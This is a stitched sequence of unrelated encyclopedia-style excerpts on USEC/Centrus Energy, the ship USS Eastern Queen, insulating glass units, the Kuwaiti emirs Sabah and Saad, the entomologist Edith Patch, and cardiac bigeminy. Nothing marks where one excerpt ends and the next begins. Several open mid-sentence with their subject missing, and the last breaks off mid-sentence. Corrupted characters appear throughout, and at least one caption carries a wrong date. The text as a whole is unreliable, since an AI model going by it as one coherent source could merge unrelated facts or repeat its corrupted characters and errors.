(formerly USEC Inc.), is a corporation that contracts with the United States Department of Energy to produce enriched uranium for use in nuclear power plants. History The Energy Policy Act of 1992 created the United States Enrichment Corporation out of the Department of Energy as a state owned enterprise to enrich uranium for civilian use, and in July 1993 USEC took over DOE facilities. USEC was fully privatized by the U.S. government on July 28, 1998 through an initial public offering. The U.S. government received about three billion dollars for USEC. USEC had gaseous diffusion plants at Piketon, Ohio near Portsmouth. The United States Nuclear Regulatory Commission assumed regulatory authority over the Portsmouth facility in March of 1997 and on June 5, 1998 the agency made an investigation into alleged \\"failure to control components with uranium deposits, inadequate maintenance, testing and operation of safety valves on equipment, and exceeding the possession limit for uranium enriched greater than 20 percent.\\"United States Nuclear Regulatory Commission. 29 May 1998. (Press Release). NRC website Retrieved 8 November 2019. In May 2001, USEC ceased uranium enrichment operations in Piketon and consolidated operations in Paducah, Kentucky. The following year, transfer and shipping operations were also consolidated at Paducah. A demonstration gas centrifuge plant was being built at Piketon for initial commercial operation in 2009, with a full-size plant is planned there for operation in 2012. However, in July 2009 the DOE did not grant a $2 billion loan guarantee for a planned uranium-enrichment facility in Piketon, Ohio, \\"causing the initiative to go into financial meltdown,\\" the company USEC spokesperson Elizabeth Stuckle said, adding \\"we are now forced to initiate steps to demobilize the project.\\" On July 28, 2009, the company said that it was suspending work on the project because of the Department of Energy's decision not to provide loan guarantees. The Energy Department said that the proposed plant was not ready for commercial production and therefore ineligible for the loan guarantees. The department said that if USEC withdraws its application, it will receive $45 million over the next 18 months to conduct further research. Before its downsizing and final cessation of uranium enrichment on May 31, 2013, the Paducah Gaseous Diffusion Plant consumed about 3,000 megawatts of electricity at peak operation. Power for the Paducah gaseous diffusion plant came from the Tennessee Valley Authority (TVA). In 2012 the majority of the TVA grid was generated by coal fired plants, with three nuclear power plants counting for about 30 percent of TVA's energy. The Department of Energy remains responsible for clean-up of the sites of materials left there prior to 1993. USEC was the executive agent in the U.S./Russia Highly Enriched Uranium Purchase Agreement, implemented under the Megatons to Megawatts Program. On December 16, 2013, USEC announced that it had reached an agreement with a majority of its debt holders to file a prearranged and voluntary Chapter 11 bankruptcy restructuring in the first quarter of 2014. On September 30, 2014, executives announced that the company had emerged from bankruptcy proceedings with a new name, Centrus Energy Corp.

Construction, acquisition, and commissioning Eastern Queen was built as the commercial cargo ship SS Tofuku Maru and completed in February 1918 by the Kawasaki Dockyard Company at Kobe, Japan. She soon was delivered to the United States Shipping Board, which renamed her SS Eastern Queen. On 22 July 1918, the U.S. Navys 13th Naval District inspected her for possible naval service during World War I. After she was converted by the Baltimore Drydock and Shipbuilding Company at Baltimore, Maryland, into an animal transport for naval use, the Shipping Board transferred her to the Navy on 19 October 1918. The Navy assigned her the naval registry identification number 3406 and commissioned her on 26 October 1918 as USS Eastern Queen (ID-3406) with Lieutenant Commander W. M. Gifford, USNRF, in command. Operational history Eastern Queen departed Norfolk, Virginia, on 25 November 1918 - two weeks after 11 November 1918 Armistice with Germany had brought World War I to an end - carrying 550 horses plus other cargo. She arrived at St. Nazaire, France, on 14 December 1918 and discharged her cargo. She embarked 30 United States Army passengers and, ballasted with steel, got underway from St. Nazaire on 29 December 1918 on a voyage to Baltimore, which she reached on 15 January 1919. Eastern Queen began a second transatlantic crossing on 2 February 1919 with a U.S. Army cargo of food, motor oil, and other cargo. She called at La Pallice and Bordeaux, France, before returning to the United States on 10 April 1919. Decommissioning and disposal Eastern Queen was decommissioned on 19 April 1919. The Navy transferred her back to the U.S. Shipping Board the same day. References *Department of the Navy: Naval Historical Center Online Library of Selected Images: Civilian Ships: S.S.

Insulating glass units (IGUs) are typically manufactured with glass in thicknesses from 3 to 10 mm (1/8\\" to 3/8\\"). Thicker glass is used in special applications. Laminated or tempered glass may also be used as part of the construction. Most units are produced with the same thickness of glass on both panes but special applications such as acoustic attenuation or security may require different thicknesses of glass to be incorporated in a unit. sectioned diagram of a fixed insulating glass unit (IGU), indicating the numbering convention used in this article. Surface #1 is facing outside, Surface #2 is the inside surface of the exterior pane, Surface #3 is the outside surface of the interior pane, and Surface #4 is the inside surface of interior pane. The window frame is labelled #5, a spacer is indicated as #6, seals are shown in red (#7), the internal reveal is on the right hand side (#8) and the exterior windowsill on the left (#9) Double-hung and storm windows A typical installation of insulated glass windows with uPVC frames Insulating glass is an evolution from older technologies known as double-hung windows and storm windows. Traditional double-hung windows used a single pane of glass to separate the interior and exterior spaces. * In the summer, a window screen would be installed on the exterior over the double-hung window to keep out animals and insects. * In the winter, the screen was removed and replaced with a storm window, which created a two-layer separation between the interior and exterior spaces, increasing window insulation in cold winter months. To permit ventilation the storm window may be hung from removable hinge loops and swung open using folding metal arms. No screening was usually possible with open storm windows, though in the winter, insects typically are not active. Traditional storm windows and screens are relatively time consuming and labor- intensive, requiring removal and storage of the storm windows in the spring, and reinstallation in the fall and storage of the screens. The weight of the large storm window frame and glass makes replacement on upper-stories of tall buildings a difficult task requiring repeatedly climbing a ladder with each window and trying to hold the window in place while securing retaining clips around the edges. However, current reproductions of these old-style storm windows can be made with detachable glass in the bottom pane that can be replaced with a detachable screen when desired. This eliminates the need for changing the entire storm window according to the seasons. Insulated glazing forms a very compact multi-layer sandwich of air and glass, which eliminates the need for storm windows. Screens may also be left installed year-round with insulated glazing, and can be installed in a manner that permits installation and removal from inside the building, eliminating the requirement to climb up the exterior of the house to service the windows. It is possible to retrofit insulated glazing into traditional double-hung frames, though this would require significant modification to the wood framed due to the increased thickness of the IG assembly. Modern window units with IG typically completely replace the older double-hung unit, and include other improvements such as better sealing between the upper and lower windows, and spring-operated weight balancing that removes the need for large hanging weights inside the wall next to the windows, allowing for more insulation around the window and reducing air leakage, provides robust protection against the sun and will keep the house cool in the hot summer and warm in winter. These spring-operated balancing mechanisms also typically permit the top of the windows to swing inward, permitting cleaning of the exterior of the IG window from inside the building. Spacer Spacer: 9.5/13.5/19.5 mm The glass panes are separated by a \\"spacer\\". A spacer, which may be of the warm edge type, is the piece that separates the two panes of glass in an insulating glass system, and seals the gas space between them. The first spacers were made primarily of steel and aluminum, which manufacturers thought provided more durability, and their lower price means that they remain common. However, metal spacers conduct heat (unless the metal is thermally improved), undermining the ability of the insulated glass unit (IGU) to reduce heat flow. It may also result in water or ice forming at the bottom of the sealed unit because of the sharp temperature difference between the window and surrounding air. To reduce heat transfer through the spacer and increase overall thermal performance, manufacturers may make the spacer out of a less-conductive material such as structural foam. A spacer made of aluminum that also contains a highly structural thermal barrier reduces condensation on the glass surface and improves insulation, as measured by the overall U-value. * A spacer that reduces heat flow in glazing configurations may also have characteristics for sound dampening where external noise is an issue. * Typically, spacers are filled with or contain desiccant to remove moisture trapped in the gas space during manufacturing, thereby lowering the dew point of the gas in that space, and preventing condensation from forming on surface #2 when the outside glass pane temperature falls. * New technology has emerged to combat the heat loss from traditional spacer bars, including improvements to the structural performance and long-term-durability of improved metal (aluminum with a thermal barrier) and foam spacers.  Construction  IGUs are often manufactured on a made to order basis on factory production lines, but standard units are also available. The width and height dimensions, the thickness of the glass panes and the type of glass for each pane as well as the overall thickness of the unit must be supplied to the manufacturer. On the assembly line, spacers of specific thicknesses are cut and assembled into the required overall width and height dimensions and filled with desiccant. On a parallel line, glass panes are cut to size and washed to be optically clear. Examples of modern plastic and wooden window profiles with insulated glazing An adhesive sealant (polyisobutylene) is applied to the face of the spacer on each side and the panes pressed against the spacer. If the unit is gas-filled, two holes are drilled into the spacer of the assembled unit, lines are attached to draw out the air out of the space and replacing it (or leaving just vacuum) with the desired gas. The lines are then removed and holes sealed to contain the gas. The more modern technique is to use an online gas filler, which eliminates the need to drill holes in the spacer. The units are then sealed on the edge side using either polysulfide or silicone sealant or similar material to prevent humid outside air from entering the unit. The desiccant will remove traces of humidity from the air space so that no water appears on the inside faces (no condensation) of the glass panes facing the air space during cold weather. Some manufacturers have developed specific processes that combine the spacer and desiccant into a single step application system. The insulating glazing unit, consisting of two glass panes bound together into a single unit with a seal between the edges of the panes, was patented in the United States by Thomas Stetson in 1865. It was developed into a commercial product in the 1930s, when several patents were filed, and a product was announced by the Libbey-Owens-Ford Glass Company in 1944. See note 25. Their product was sold under the Thermopane brand name, which had been registered as a trademark in 1941. The Thermopane technology differs significantly from contemporary IGUs. The two panes of glass were welded together by a glass seal, and the two panes were separated by less than the typical of modern units. The brand name Thermopane has entered the vocabulary of the glazing industry as the genericized trademark for any IGU.  Thermal performance  The maximum insulating efficiency of a standard IGU is determined by the thickness of the space. Typically, most sealed units achieve maximum insulating values using a space of when measured at the centre of the IGU. IGU thickness is a compromise between maximizing insulating value and the ability of the framing system used to carry the unit. Some residential and most commercial glazing systems can accommodate the ideal thickness of a double-paned unit. Issues arise with the use of triple glazing to further reduce heat loss in an IGU. The combination of thickness and weight results in units that are too unwieldy for most residential or commercial glazing systems, particularly if these panes are contained in moving frames or sashes. This trade-off does not apply to vacuum insulated glass (VIG), or evacuated glazing, as heat loss due to convection is eliminated, leaving radiation losses and conduction through the edge seal and required supporting pillars over the face area. These VIG units have most of the air removed from the space between the panes, leaving a nearly-complete vacuum. VIG units which are currently on the market are hermetically sealed along their perimeter with solder glass, that is, a glass frit (powdered glass) having a reduced melting point is heated to join the components. This creates a glass seal that experiences increasing stress with increasing temperature differential across the unit. This stress may limit the maximum allowable temperature differential. One manufacturer provides a recommendation of 35 ¬∞C. Closely spaced pillars are required to reinforce the glazing to resist the pressure of the atmosphere. Pillar spacing and diameter limited the insulation achieved by designs available beginning in the 1990s to R = 4.7 h¬∑¬∞F¬∑ft2/BTU (0.83 m2¬∑K/W) no better than high quality double glazed insulated glass units. Recent products claim performance of R = 14 h¬∑¬∞F¬∑ft2/BTU (2.5 m2¬∑K/W) which exceeds triple glazed insulated glass units. The required internal pillars exclude applications where an unobstructed view through the glazing unit is desired, i.e. most residential and commercial windows, and refrigerated food display cases. Vacuum technology is also used in some non-transparent insulation products called vacuum insulated panels. An older-established way to improve insulation performance is to replace air in the space with a lower thermal conductivity gas. Gas convective heat transfer is a function of viscosity and specific heat. Monatomic gases such as argon, krypton and xenon are often used since (at normal temperatures) they do not carry heat in rotational modes, resulting in a lower heat capacity than poly- atomic gases. Argon has a thermal conductivity 67% that of air, krypton has about half the conductivity of argon. Argon is almost 1% of the atmosphere and isolated at a moderate cost. Krypton and xenon are only trace components of the atmosphere and very expensive. All of these \\"noble\\" gases are non-toxic, clear, odorless, chemically inert, and commercially available because of their widespread application in industry. Some manufacturers also offer sulfur hexafluoride as an insulating gas, especially to insulate sound. It has only 2/3 the conductivity of argon, but it is stable, inexpensive and dense. However, sulfur hexafluoride is an extremely potent greenhouse gas that contributes to global warming. In Europe, falls under the F-Gas directive which ban or control its usage for several applications. Since 1 January 2006, is banned as a tracer gas and in all applications except high-voltage switchgear. In general, the more effective a fill gas is at its optimum thickness, the thinner the optimum thickness is. For example, the optimum thickness for krypton is lower than for argon, and lower for argon than for air.ASHRAE Handbook, Volume 1, Fundamentals, 1993 However, since it is difficult to determine whether the gas in an IGU has become mixed with air at time of manufacture (or becomes mixed with air once installed), many designers prefer to use thicker gaps than would be optimum for the fill gas if it were pure. Argon is commonly used in insulated glazing as it is the most affordable. Krypton, which is considerably more expensive, is not generally used except to produce very thin double glazing units or extremely high performance triple-glazed units. Xenon has found very little application in IGUs because of cost.http://www.ktu.lt/ultra/journal/pdf_51_2/51-2004-Vol.2_01-J.Butkus.pdf Heat insulating properties The effectiveness of insulated glass can be expressed as an R-value. The higher the R-value, the greater is its resistance to heat transfer. A standard IGU consisting of clear uncoated panes of glass (or lights) with air in the cavity between the lights typically has an R-value of 0.35 K¬∑m2/W. Using US customary units, a rule of thumb in standard IGU construction is that each change in the component of the IGU results in an increase of 1 R-value to the efficiency of the unit. Adding argon gas increases the efficiency to about R-3. Using low emissivity glass on surface #2 will add another R-value. Properly designed triple-glazed IGUs with low emissivity coatings on surfaces #2 and #4 and filled with argon gas in the cavities result in IG units with R-values as high as R-5. Certain vacuum insulated glass units (VIGU) or multi-chambered IG units using coated plastic films result in R-values as high as R-12.5 Additional layers of glazing provide the opportunity for improved insulation. While the standard double glazing is most widely used, triple glazing is not uncommon, and quadruple glazing is produced for very cold environments such as Alaska. Even quintuple and six-pane glazing (four or five cavities) is available - with mid-pane insulation factors equivalent to walls. Acoustic insulating properties In some situations the insulation is in reference to noise mitigation. In these circumstances a large air space improves the noise insulation quality or sound transmission class. Asymmetric double glazing, using different thicknesses of glass rather than the conventional symmetrical systems (equal glass thicknesses used for both lights) will improve the acoustic attenuation properties of the IGU. If standard air spaces are used, sulfur hexafluoride can be used to replace or augment an inert gas and improve acoustical attenuation performance. Other glazing material variations affect acoustics. The most widely used glazing configurations for sound dampening include laminated glass with varied thickness of the interlayer and thickness of the glass. Including a structural, thermally improved aluminum thermal barrier air spacer in the insulating glass can improve acoustical performance by reducing the transmission of exterior noise sources in the fenestration system. Reviewing the glazing system components, including the air space material used in the insulating glass, can ensure overall sound transmission improvement.  Longevity  The life of an IGU varies depending on the quality of materials used, size of gap between inner and outer pane, temperature differences, workmanship and location of installation both in terms of facing direction and geographic location, as well as the treatment the unit receives. IG units typically last from 10 to 25 years, with windows facing the equator often lasting less than 12 years. IGUs typically carry a warranty for 10 to 20 years depending upon the manufacturer. If IGUs are altered (such as installation of a solar control film) the warranty may be voided by the manufacturer. The Insulating Glass Manufacturers Alliance (IGMA) undertook an extensive study to characterize the failures of commercial insulating glass units over a 25-year period. For a standard construction IG unit, condensation collects between the layers of glass when the perimeter seal has failed and when the desiccant has become saturated, and can generally only be eliminated by replacing the IGU. Seal failure and subsequent replacement results in a significant factor in the overall cost of owning IGUs. Large temperature differences between the inner and outer panes stress the spacer adhesives, which can eventually fail. Units with a small gap between the panes are more prone to failure because of the increased stress. Atmospheric pressure changes combined with wet weather can, in rare cases, eventually lead to the gap filling with water. The flexible sealing surfaces preventing infiltration around the window unit can also degrade or be torn or damaged. Replacement of these seals can be difficult to impossible, due to IG windows commonly using extruded channel frames without seal retention screws or plates. Instead, the edge seals are installed by pushing an arrow-shaped indented one-way flexible lip into a slot on the extruded channel, and often cannot be easily extracted from the extruded slot to be replaced. In Canada, since the beginning of 1990, there are some companies offering servicing of failed IG units. They provide open ventilation to the atmosphere by drilling hole(s) in the glass and/or spacer. This solution often reverses the visible condensation, but cannot clean the interior surface of the glass and staining that may have occurred after long- term exposure to moisture. They may offer a warranty from 5 to 20 years. This solution lowers the insulating value of the window, but it can be a \\"green\\" solution when the window is still in good condition. If the IG unit had a gas fill (e.g. argon or krypton or a mixture) the gas is naturally dissipated and the R-value suffers. Since 2004, there are also some companies offering the same restoration process for failed double-glazed units in the UK, and there is one company offering restoration of failed IG units in Ireland since 2010. = Thermal stress cracking = Thermal stress cracking isn't different for insulated glazing and uninsulated glazing. Temperature differences across the surface of glass panes can lead to cracking of the glass. This typically occurs where the glass is partially shaded and one section is heated in sunlight. Tinted glass increases heating and thermal stress, while annealing reduces internal stress built into the glass during manufacturing leaving more strength available to resist thermal cracking. Viracon Corporation, Owatonna, MN, \\"Tech Talk: Thermal stress cracking\\", 2001, http://www.viracon.com/images/pdf/TTThermalStress.pdf Thermal expansion creates internal pressure, or stress, where expanding warm material is restrained by cooler material. A crack may form if the stress exceeds the material strength and the crack will propagate until the stress at the tip of the crack is below the material's strength. Typically cracks initiate and propagate from the narrow shaded cut edge where the material is weak and the stress is spread over a small glass volume compared to the open area. Glass thickness has no direct effect on thermal cracking in windows because both thermal stress and material strength are proportional to thickness. While thicker glass will have more strength remaining after supporting wind loads, that's usually only a significant factor for large glazing units on tall buildings and wind improves heat dissipation. Increased resistance to cracking with thicker glazing in common residential and commercial applications is more reliably result of using tempered glass to satisfy building safety codes requiring its use to reduce the severity of injuries when broken. Cut edge stresses have to be reduced by annealing prior to tempering and that removes stress concentrations created during glass cutting and that significantly increases the stress required to initiate a crack from the edge. The cost to process tempered glass is much greater than the cost difference between 1/8\\" (3 mm) glass and 3/16\\" (5 mm) or 1/4\\" (6.5 mm) material, prompting glaziers to suggest replacing cracked glazing with thicker glass. It may also avoid revealing to the customer that tempered glass should have been used initially.  Estimating heat loss from double-glazed windows  Given the thermal properties of the sash, frame, and sill, and the dimensions of the glazing and thermal properties of the glass, the heat transfer rate for a given window and set of conditions can be calculated. This can be calculated in kW (kilowatts), but more usefully for cost benefit calculations can be stated as kWh pa (kilowatt hours per annum), based on the typical conditions over a year for a given location. The glass panels in double-glazed windows transmit heat in both directions by radiation, through the glazing by conduction and across the gap between the panes by convection, by conduction through the frame, and by infiltration around the perimeter seals and the frame's seal to the building. The actual rates will vary with the conditions throughout the year, and while solar gain may be much welcomed in the winter (depending on local climate), it may result in increased air conditioning costs in the summer. Unwanted heat transfer can be mitigated by for example using curtains at night in the winter and using sun shades during the day in the summer. In an attempt to provide a useful comparison between alternative window constructions the British Fenestration Rating Council have defined a \\"Window Energy Rating\\" WER, ranging from A for the best down through B and C etc. This takes into account a combination of the heat loss through the window (U value, the reciprocal of R-value), the solar gain (g value), and loss through air leakage around the frame (L value). For example, an A Rated window will in a typical year gain as much heat from solar gain as it loses in other ways (however the majority of this gain will occur during the summer months, when the heat may not be needed by the building occupant). This provides better thermal performance than a typical wall.

On 15 January 2006, the Emir, Sheikh Jaber, died, making Sheikh Saad, Crown Prince of Kuwait, the new Emir. With Saad's accession, Sabah was likely to become the new Crown Prince, retaining his function of Prime Minister. But the Constitution requires that the Emir be sworn in before Parliament, and the oath of office is complex. Soon, word began to spread that Saad was unable to take the oath in full. Some reports suggested that he suffered from Alzheimer's disease or some other debilitating disease; it was generally agreed that he was unable to speak, at least at any length. After a power struggle within the ruling family, Saad agreed to abdicate as Emir of Kuwait on 23 January 2006 due to his illness. The ruling family then conferred and Sabah became the new Emir. On 24 January 2006, the National Assembly of Kuwait voted Saad out of office, moments before an official letter of abdication was received. The Cabinet of Kuwait nominated Sabah as Emir. He was sworn in on 29 January 2006 with the National Assembly's approval, ending that crisis. =Dissolution of the National Assembly= Islamic Summit Conference in Istanbul Sabah with U.S. President Barack Obama in 2009 Sabah with U.S. President Donald Trump in 2018 Sabah dissolved the National Assembly on 19 March 2008 and called for early elections on 17 May 2008, after the cabinet resigned in the week of 17 March 2008 following a power struggle with the government.

In 2016 Sabah hosted several United Nations sponsored meetings of leaders from the warring factions in the Yemeni Civil War. Sabah quickly established Kuwait as the key mediator in the Qatar diplomatic crisis, meeting with Saudi and Emirati officials on 6‚Äì7 June before leaving for Doha to discuss the rift with Qatari leaders. His ongoing efforts have been publicly supported by Qatar and other interested parties from the region as well as the U.S., UK, France, and Germany. At the beginning of September 2017, Sabah discussed the situation with top officials in Washington, D.C., including U.S. President Donald Trump, who \\"hailed his efforts\\" to mediate and \\"applauded Kuwait's 'critical contributions to regional stability'\\". There were some questions from the boycotting countries about any preconditions. French President Emmanuel Macron stated French support for Sabah's mediation efforts after a meeting in Paris on 15 September 2017, reiterating June 2017 statements of support for the initiative. Trump and Sabah had a third meeting at the White House on 5 September 2018. =Humanitarianism = Former U.S. President Jimmy Carter called Sabah a \\"global humanitarian leader\\", saying, \\"His support of disaster relief, peace efforts and advancing public health are an inspiration. Other world leaders can learn from the wise example set by my friend, His Highness the Emir.\\" According to the 2014 Middle East Coutts Report, Sabah provided the largest individual donation in 2013 among GCC members in support of Syrian refugees in neighboring countries, $300 million. Also in 2014, United Nations Secretary- General Ban Ki-moon cited Sabah as a humanitarian leader globally and presented him with a Humanitarian Award. Ban said, \\"It gives me great pleasure and honour to be here today to recognize the leadership of His Highness Sheikh Sabah Al Ahmad Al Jaber al Sabah, Emir of Kuwait. This is a great humanitarian day. We are sitting together with a great humanitarian leader of our world\\".United Nations: Kuwait‚Äôs ‚ÄòExemplary Humanitarian Leadership' https://www.un.org/press/en/2014/sgsm16132.doc.htm In 2015, Sabah pledged $500 million toward easing the Syrian humanitarian crisis at the UN Summit convened in Kuwait. In August 2017, UN Secretary-General Ant√≥nio Guterres expressed gratitude for Kuwait's leadership in humanitarian action, as well as the \\"dialogue [‚Ä¶] and promotion of understanding Kuwait has shown in relation to all conflicts in the region,\\" adding, \\"But it's not only the humanitarian leadership of Kuwait, it's the wisdom, the dialogue, the promotion of understanding that Kuwait has shown in relation to all conflicts in the region. Kuwait has no agenda. The agenda of Kuwait is peace; is understanding.\\" Guterres further noted the positive role Sabah played in the current GCC crisis and recalled that when he was High Commissioner for Refugees (June 2005 to December 2015) Sabah presided over the three conferences to mobilize the international community to support the Syrian people. =Human rights violations= Al-Sabah had jailed several members of parliament for criticizing him publicly.https://www.reuters.com/article/uk- kuwait-court- idUKKBN1JY0E8https://www.amnesty.org/en/latest/news/2012/11/kuwait/  Death and succession UAE flag in half-mas as part of mourning for Kuwait Emir Sheikh Sabhah Al Ahmad on 29th Sep 2010 After months of hospitalization at the Mayo Clinic in Rochester, Minnesota, Al-Sabah died on 29 September 2020 at 08:00 CDT (16:00 Kuwaiti Time) at the age of 91 due to long-term health issues.

Born in Worcester, Massachusetts, she received a degree from the University of Minnesota in 1901 and originally embarked on a career as an English teacher before receiving the opportunity to organize the entomology department at the University of Maine. She became the head of the entomology department in 1904, and, despite misgivings from several male colleagues about having a female department head, she remained in this post until her retirement in 1937. Edith Patch is recognized as the first truly successful professional woman entomologist in the United States. Patch earned her master's degree from the university of Maine in 1910 and a Ph.D. from Cornell University in Ithaca, New York in 1911. During her career, she was recognized as an expert on aphids and published Food Plant Catalogue of the Aphids in 1938. She was elected president of the American Nature Study Society and in 1930 became the first female president of the Entomological Society of America. Patch's residence in Old Town, Maine, was added to the National Register of Historic Places in 2001. Bird Stories Early life Edith Marion Patch was the youngest of six children of William Whipple Patch Jr. and Salome Jenks. After the American civil war, the family moved to New Vinton, Iowa but returned to Worcester in 1872. Her interest in natural history became evident at an early age and she used to ramble near her home, studying the animals, flowers and plants she saw there. The family moved to Minneapolis, Minnesota in 1881, when she was eight and then out into the countryside again two years later, when she was able to resume her interests in natural history. She was sufficiently knowledgeable while still at school to write an essay on the monarch butterfly which won her a prize in a competition. She invested her $25 reward in a copy of John Henry Comstock's \\"Manual for the Study of Insects\\" with illustrations by Anna Botsford Comstock. After graduating from Minneapolis's South High School in 1896, Patch went to the University of Minnesota, graduating with a BSc in 1901. At first she was unable to find suitable employment as an entomologist and spent two years teaching English at a high school, but she got her chance when Dr. Charles D. Woods offered her an unpaid post. The job was at the University of Maine in the Maine Agricultural Experiment Station to start up an entomology department. Woods decision to appoint based on merit and not gender was vindicated when she was granted a full-time job the following year. Career Patch and other staff at the Maine Agricultural Experiment Station c. 1915 Patch was always concerned with the practical applications of entomology and wrote bulletins about the pests of agricultural and horticultural crops of Maine and forest trees. Her specialism was the aphid family with their complex life histories, their capacity to transmit viruses and their alternating host plants. She may have been influenced in this choice by the fact that she had worked with Professor Oestlund, an expert on aphids, in Minnesota before going to University. She remained at the University of Maine throughout her career, obtaining her master's degree in 1911 and her doctorate from Cornell University a year later. While at Cornell, she became friends with the Comstock family. She published about eighty scientific papers on aphids, their identification, their biology and the role they played in the environment. She made the important discovery that the eggs of the melon aphid overwintered on a weed, (Sedum purpureum), and that removing this weed from the vicinity reduced infestation of crops the following year. In 1938, she published an important book, the \\"Food Plant Catalogue of the Aphids\\", which listed her discoveries on the host plants used by different species of aphids. She also published articles in the \\"Maine Agricultural Experiment Station Bulletin\\" and wrote others for the general public in horticultural magazines and the Atlantic Monthly Magazine, the Maine naturalist and the Scientific Monthly Magazine. She realised how useful beneficial insects could be in controlling pests and disapproved of the indiscriminate application of pesticides. In this, her ideas pre-dated Rachel Carson and her \\"Silent Spring\\" by forty years. Patch made an extensive collection of Aphididae which is maintained as part of the Canadian National Collection in Ottawa. It contained both winged and wingless forms of each species and has been widely used by researchers. She was considered a world authority on aphids and had two genera, five species and one sub-species named in her honour. She herself was the author of a number of newly described species. Patch was elected president of the American Nature Study Society in 1930. She also became the first female president of the Entomological Society of America at a time when this male-dominated society admitted few women. Writing career Patch's 50-acre home beside the Stillwater River in Old Town, Maine After acquiring her PhD, Patch embarked on writing books and magazine articles on natural history for children, designed to stimulate their interest and enthusiasm for the natural world. They were published at first by the Pine Cone Publishing Company in Orono, which seems to have been her own enterprise. In 1913, Patch published Dame Bug and her Babies, a collection of 18 stories about insect mothers and their young. This invoked a passion in Patch to continue to educate young minds about nature through her writings. An additional publishing, Little Gateways to Science, told the story of 12 birds and the unpropitious effects human activity can have on the natural world. Later, after her reputation as a natural history writer for children was established, she was taken on by the better known Macmillan Publishers. With them she produced the \\"Holiday Series\\", on the wildlife and plants found in various habitats, the \\"Neighbor Series\\", with information on wild animals in their natural settings, and the \\"Science Readers\\" for schools, covering scientific topics for children up to eighth grade. Patch House In 1913, Patch purchased an old farmhouse with fifty acres of land at Old Town, Maine and lived there for the rest of her life. She called the house \\"Braeside\\" but it later became known as \\"Patch House\\". Built in the 1840s, \\"Braeside\\" is a derivative of the Scottish word brae meaning bank, which refers to its location alongside the Stillwater River. The property consists of 50 acres of wild garden, home to bustling societies of insects where Patch spent most of her free time studying and writing about the natural world. It passed into the possession of the University of Maine after her death and was used for student accommodation. By the 1990s it was deemed to be in violation of various codes of safety and was destined for demolition, and an arrangement was made to allow it to be burned down as a training exercise for firefighters. In 1997, a few days before it was due to go up in flames, activists managed to get it added to Maine's list of most endangered properties and it was saved for posterity. In 2001 it was added to the National Register of Historic Places.

Most often this is due to ectopic beats, or extra beats, occurring so frequently that there is one after each sinus beat, or normal rhythm beat. The two beats are figuratively similar to two twins (hence bi- + gemini). The ectopic beat is typically a premature ventricular contraction (PVC). For example, in ventricular bigeminy, a sinus beat is shortly followed by a PVC, a pause, another normal beat, and then another PVC. In atrial bigeminy, the other \\"twin\\" is a premature atrial contraction (PAC).  Cause  After any PVC there is a pause that can lead to the development of bigeminy. A PVC wavefront often encounters a refractory AV node that does not conduct the wavefront retrograde. Thus the atrium is not depolarized and the sinus node is not reset. Since the sinus p wave to PVC interval is less than the normal P-P interval, the interval between the PVC and the next p wave is prolonged to equal the normal time elapsed during two P-P intervals. This is called a \\"compensatory\\" pause. The pause after the PVC leads to a longer recovery time, which is associated with a higher likelihood of myocardium being in different stages of repolarization. This then allows for re-entrant circuits and sets up the ventricle for another PVC after the next sinus beat. The constant interval between the sinus beat and PVC suggests a reentrant etiology rather than spontaneous automaticity of the ventricle. Atrial premature complexes (APCs) do not have a compensatory pause since they reset the sinus node but atrial or supraventricular bigeminy can occur. If the APCs are very premature, the wavefront can encounter a refractory AV node and not be conducted. This can be mistaken for sinus bradycardia if the APC is buried in the T wave since the APC will reset the SA node and lead to a long P-P interval. Diagnosis A rhythm strip demonstrating bigeminy simple ECG of a Supraventricular Bigeminy = Rule of bigeminy = When the atrial rhythm is irregular (as in atrial fibrillation or sinus arrythmia) the presence of bigeminy depends on the length of the P-P interval and happens more frequently with a longer interval. As with post PVC pauses, a longer P-P interval leads to a higher chance of re-entrant circuits and thus PVCs. The term \\"rule of bigeminy\\" is used to refer to the dependence of bigeminy on the ventricular cycle length in irregular rhythms. = Classification = There can be similar patterns depending on the frequency of abnormal beats. If every other beat is abnormal, it is described as bigeminal. If every third beat is aberrant, it is trigeminal; every fourth would be quadrigeminal. Typically, if every fifth or more beat is abnormal, the aberrant beat would be termed occasional. Bigeminy is contrasted with couplets, which are paired abnormal beats. Groups of three abnormal beats are called triplets and are considered a brief run of non- sustained ventricular tachycardia (NSVT), and if the grouping lasts for more than 30 seconds, it is ventricular tachycardia (VT).  Treatment  In people without underlying heart disease and who do not have any symptoms, bigeminy in itself does not require any treatment. If it does become symptomatic, beta- blockers can be used to try and suppress ventricular ectopy. Class I and III agents are generally avoided as they can provoke more serious arrhythmias.

Sheikh Saad was a general commander in the Military of Kuwait; in addition, the first to head the Kuwaiti Ministry of Interior until 16 February 1978 and the first military officer to head the Ministry of Defense since 1964. Nine Ministers headed the Interior Ministry since Kuwait's independence Early life Sheikh Saad, who was born in 1930, belonged to the Al-Salem branch of the Al-Sabah family and was eldest son of Abdullah Al-Salem Al-Sabah, who ruled Kuwait from 1950 to 1965. He had two younger paternal half-brothers; Sheikh Khalid and Sheikh Ali. His youngest brother Sheikh Ali Abdullah Al-Salem Al-Sabah is a governor. His mother Jameela was Ethiopian slave.He attended the Mubarakiya school in Kuwait and Hendon Police College in North London. Early career Sheikh Saad was a pillar and debuted his career as the first military officer to head the Kuwait Ministry of Interior and Kuwait Ministry of Defense since 1962 and 1964 respectively. He served as the general commander of the Directorate of Public Security Force and the Directorate of Police from 1961 to 1962. Consequently, he was appointed as the first Minister of Interior. With the forming the 3rd government on 6 December 1964; Sheikh Saad was appointed both minister of interior and defense simultaneously and held both posts until 1978. On February 16 1978, he became Crown Prince and held the post until July 13 2006. Sheikh Saad Abdullah Al- Salem Al-Sabah, the 14th Ruler and 4th Emir From February 1978 to July 2003, he also served as Prime Minister of Kuwait, after which that role was given to Sabah Al-Ahmad Al-Jaber Al-Sabah. =First Gulf War= A former flag officer of the Military of Kuwait, Sheikh Saad was the leader involved in liberating Kuwait from Saddam's regime. He refused to deal with any of Iraq's ministers attempting to compromise the security of the country. During the exile of His Highness Jaber Al-Ahmad Al-Jaber Al-Sabah and his declaration of martial law; Sheikh Saad was appointed briefly as the military governor from 1991 to 1992. Emir of Kuwait Sheikh Saad had suffered from colon disease, which led to speculation that he would refuse the Emirship. A declaration in November 2005 refuted such speculation, and Sheikh Saad took office as Emir on 15 January 2006 upon Sheikh Jaber's death. However, Sheikh Saad attended Jaber's funeral in a wheelchair, and his continued health problems caused some to question his ability to rule. Some members of the Kuwaiti parliament expressed concern that Sheikh Saad would not be able to deliver the two-line oath of office, scheduled for 24 January 2006. Although a new Emir had not yet been announced, it was evident that the position would be assumed by Sheikh Saad's second cousin and the late Sheikh Jaber's half-brother Sabah 